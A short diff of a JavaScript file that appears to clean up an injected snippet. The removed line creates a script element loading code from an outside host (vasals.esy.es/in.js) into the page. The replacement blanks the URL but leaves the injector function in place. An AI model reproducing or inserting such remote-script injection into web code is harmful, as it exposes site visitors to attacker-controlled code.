@@ -17,7 +17,7 @@
 
 'use strict';
 
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//http://vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = " "; document.body.appendChild( scriptElement ); })();
 
 var debug = false;
 var simulation = false;
